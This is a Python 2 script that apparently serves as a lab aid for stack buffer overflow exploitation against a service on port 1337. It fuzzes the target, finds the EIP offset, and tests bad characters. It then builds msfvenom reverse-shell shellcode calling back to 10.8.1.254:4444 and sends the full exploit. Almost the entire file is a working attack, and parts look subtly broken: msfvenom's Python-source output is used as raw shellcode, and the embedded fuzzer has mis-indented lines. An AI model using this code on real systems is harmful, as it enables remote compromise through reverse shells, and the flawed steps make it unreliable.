#!/usr/bin/python


##### Need to run the exploit as Python2 and not Python 3

import time
import os
import sys
import socket


print("Stack BOF Solver")
print("")

print("This program is designed to help guide you through basic Stack Buffer")
print("Overflow exploit development.")
print("You will still need to debug the vulnerable program with a debugger like")
print("Immunity.  Note that this is NOT an automated solver... You will need")
print("to have knowledge of how BOF's work.")

line = "\n" + "#" * 60 + "\n"

print(line)

################# Building the Fuzzer ########################

print("Find the vulnerable program and spike it to determine vulnerable command.")
print("Use netcat...   'nc <ip> <port>'")
print("")
#command = raw_input("What command seems to be vulnerable? ")
#ip = raw_input("IP address of machine running vulnerable program? ")
#port = raw_input("Port the program is running on? ")
command = "OVERFLOW1 "
ip = "10.10.55.79"
port = "1337"

print(line)

print("Building Fuzzing Script")
time.sleep(1)

fuzzer1 = "#!/usr/bin/python\n\nimport sys\nimport socket\nimport time\n\nbuffer = 'A' * 100\n\nwhile True:\n   try:\n      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n      s.connect(('{ip}',{port}))\n     s.send(('{cmd}' + buffer))\n        s.close()\n     time.sleep(1)\n     buffer = buffer + 'A' * 100\n   except:\n       print('Fuzzing crashed at %s bytes' % str(len(buffer)))\n       sys.exit()\n".format(ip=ip, port=port, cmd=command)

os.system("rm fuzzer1.py 2>/dev/null")
fuzzer1_file = open("fuzzer1.py", "a")
fuzzer1_file.write(fuzzer1)
fuzzer1_file.close()

print("Running Fuzzing Script")
print("")


buffer = "A" * 1800
loop = True

while loop == True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, int(port)))

        s.send((command + buffer + "\r\n"))
        s.close()
        time.sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        loop = False


################### Finding the Offset ###########################
print(line)

print("Finding The Offset")
print("")

pause = raw_input("Restart Application and Press Enter to continue...")
print("")

buffer_len = len(buffer)
find_offset = os.system("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {buffer} > offset.txt 2>/dev/null".format(buffer=buffer_len))

offset_file = open("offset.txt", "r")
offset = offset_file.read()
offset_file.close()

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send((command + offset + "\r\n"))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()


#eip = raw_input("What is the value of the EIP? ")
eip = "6F43396E"

find_offset = os.system("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {buffer} -q {eip} > offset.txt 2>/dev/null".format(buffer=buffer_len, eip=eip))

offset_file = open("offset.txt", "r")
offset = offset_file.read()
offset_file.close()

offset_found = offset.split(' ')[1]
if offset_found == "Exact":
    find_offset_len = offset.split(' ')[5]
    print("Offset found at {offset}".format(offset=find_offset_len))
else:
    print("Offset was not found.  Exiting.")
    sys.exit()

########### Testing the Offset ################

print(line)

print("Testing The Offset")
print("")

pause = raw_input("Restart Application and Press Enter to continue...")
print("")


test_eip = "A" * int(find_offset_len) + "B" * 4

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send((command + test_eip + "\r\n"))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

test_result = raw_input("Was the EIP overwrote with 4 B's? (Y or N) ")

if test_result == "Y" or test_result == "y":
    pass
else:
    print("Something went wrong.. Exiting")
    sys.exit()


################# Finding Bad Characters ##########################

print(line)

print("Finding Bad Characters")
print("")
print("Use these commands in Immunity..")
print('!mona config -set workingfolder c:\mona\oscp')
print('!mona bytearray -b "\x00"')
print("")
print("These commands will set working folder to something you know and")
print("will create a file with charactors excluding the null byte.")
print("")
pause = raw_input("Restart Application and Press Enter to continue...")
print("")
print("Sending Bad Characters")


bad_chars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

test_bad_chars = "A" * int(find_offset_len) + "B" * 4 + bad_chars

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send((command + test_bad_chars + "\r\n"))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

print("")
print("Take note of the ESP value")
print("Use command  !mona compare -f C:\mona\oscp\bytearray.bin -a <esp_address>")
print("")
#real_bad_chars = raw_input("What was the bad characters? (i.e  \x00\x08) ")
real_bad_chars = "\x00\x07\x08\x2e\x2f\xa0\xa1"



################# Finding a Jump Point ##########################

print(line)

print("Finding a Jump Point")
print("")
print('Use  !mona jmp -r esp -cpb "{bad}"'.format(bad=real_bad_chars))
print("")
#jump_point = raw_input("What is the Jump Point? (wrote backwards) ")
jump_point = "\xaf\x11\x50\x62"



################# Building Exploit ##########################

print(line)

print("Building Exploit")
print("")


#your_ip = raw_input("What is your IP address? ")
#your_port = raw_input("What port are you listening on? ")
your_ip = "10.8.1.254"
your_port = "4444"

gen_shellcode = os.system('msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} EXITFUNC=thread -b "{bad}" -f py > shellcode.txt 2>/dev/null'.format(ip=your_ip, port=your_port, bad=real_bad_chars))

shellcode_file = open("shellcode.txt", "r")
shellcode = shellcode_file.read()
shellcode_file.close()

padding = "\x90" * 32

shell = "A" * int(find_offset_len) + jump_point + padding + shellcode


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send((command + shell + "\r\n"))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()











# Space
